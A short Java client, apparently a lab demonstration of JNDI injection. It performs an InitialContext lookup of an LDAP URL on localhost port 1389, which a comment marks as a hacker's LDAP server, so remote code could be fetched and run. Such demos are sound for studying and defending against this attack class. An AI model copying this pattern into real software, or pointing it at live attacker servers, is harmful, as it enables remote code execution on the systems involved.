import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
    public static void main(String[] args){
        try {
            String url ="ldap://127.0.0.1:1389/xxx"; //for hacker_LDAP
            Context ctx = new InitialContext();
            ctx.lookup(url);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
